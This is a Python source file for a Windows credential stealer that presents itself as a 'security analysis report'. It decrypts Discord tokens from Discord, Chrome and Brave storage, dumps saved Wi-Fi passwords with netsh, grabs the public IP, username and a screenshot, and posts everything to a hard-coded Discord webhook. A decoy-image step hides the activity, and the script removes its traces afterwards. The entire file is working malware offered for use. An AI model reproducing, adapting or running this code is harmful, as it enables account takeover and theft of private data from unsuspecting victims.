import os, re, json, base64, sqlite3, requests, subprocess, shutil, sys
from PIL import ImageGrab
import win32crypt
try:
    from Cryptodomex.Cipher import AES
except:
    from Cryptodome.Cipher import AES

# --- CONFIGURATION ---
# حط هنا رابط الـ Webhook ديالك
WEBHOOK_URL = "https://discord.com/api/webhooks/1418902069984759868/QeEnBq9MY1Krb1eWER3P7NPDwhJK8QoqZVjHJVkWWxiJhsgNkO-Hv3FbOQ9JlCrKU8nH"
DECOY_IMAGE = "https://files.catbox.moe/yp5a33.jpg" 

class R4Z_V2_DeepScan:
    def __init__(self):
        self.report = "```diff\n+ [ R4Z SECURITY ANALYSIS REPORT - V2 ]\n```\n"
        self.temp_dir = os.path.join(os.getenv('TEMP'), "r4z_scan")
        if not os.path.exists(self.temp_dir): os.makedirs(self.temp_dir)
        
        self.appdata = os.getenv('APPDATA')
        self.localappdata = os.getenv('LOCALAPPDATA')
        self.tokens = []

    def get_master_key(self, path):
        if not os.path.exists(path): return None
        try:
            with open(path, "r", encoding='utf-8') as f:
                local_state = json.loads(f.read())
            m_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            return win32crypt.CryptUnprotectData(m_key, None, None, None, 0)[1]
        except: return None

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except: return "Failed to decrypt"

    def grab_tokens(self):
        self.report += "\n🔵 DISCORD TOKENS (ENCRYPTED & PLAIN):\n"
        paths = {
            'Discord': os.path.join(self.appdata, 'discord'),
            'Discord Canary': os.path.join(self.appdata, 'discordcanary'),
            'Google Chrome': os.path.join(self.localappdata, r'Google\Chrome\User Data\Default'),
            'Brave': os.path.join(self.localappdata, r'BraveSoftware\Brave-Browser\User Data\Default')
        }

        for name, path in paths.items():
            leveldb = os.path.join(path, 'Local Storage', 'leveldb')
            if not os.path.exists(leveldb): continue
            
            # محاولة جلب الـ Master Key الخاص بهاد التطبيق
            m_key = self.get_master_key(os.path.join(path, "Local State"))
            
            try:
                for file_name in os.listdir(leveldb):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'): continue
                    with open(os.path.join(leveldb, file_name), 'r', errors='ignore') as f:
                        for line in f.readlines():
                            line = line.strip()
                            # 1. البحث عن التوكينات المشفرة (الجديدة)
                            for token in re.findall(r"dQw4w9WgXcQ:([^ ]*)", line):
                                if m_key:
                                    # التوكن كيكون مورا العلامة " ومسدود بـ "
                                    clean_token = token.split('"')[0]
                                    dec_token = self.decrypt_val(base64.b64decode(clean_token), m_key)
                                    if dec_token not in self.tokens: self.tokens.append(dec_token)
                            
                            # 2. البحث عن التوكينات العادية (القديمة)
                            for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", line):
                                if token not in self.tokens: self.tokens.append(token)
            except: pass

        if self.tokens:
            for t in self.tokens: self.report += f"🔑 {t}\n"
        else: self.report += "❌ No tokens found (Check Permissions/Locks)\n"

    def grab_wifi_and_system(self):
        try:
            ip = requests.get('https://api.ipify.org').text
            self.report += f"🌐 IP: {ip}\n👤 User: {os.getlogin()}\n"
            
            self.report += "\n📶 WIFI PASSWORDS:\n"
            profiles_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="ignore").split('\n')
            profiles = [i.split(":")[1][1:-1] for i in profiles_data if "All User Profile" in i]
            for i in profiles:
                res = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="ignore").split('\n')
                passw = [b.split(":")[1][1:-1] for b in res if "Key Content" in b]
                self.report += f"{i}: {passw[0] if passw else 'None'}\n"
        except: pass

    def take_screenshot(self):
        path = os.path.join(self.temp_dir, "capture.png")
        ImageGrab.grab().save(path)
        return path

    def send_to_webhook(self, ss_path):
        try:
            with open(ss_path, 'rb') as f:
                requests.post(WEBHOOK_URL, data={"content": self.report}, files={'file': f})
        except: pass

    def run(self):
        # تمويه
        if os.path.exists(DECOY_IMAGE): os.system(f"start {DECOY_IMAGE}")
        
        self.grab_wifi_and_system()
        self.grab_tokens()
        ss = self.take_screenshot()
        self.send_to_webhook(ss)
        
        # تنظيف
        shutil.rmtree(self.temp_dir, ignore_errors=True)

if __name__ == "__main__":
    R4Z_V2_DeepScan().run()
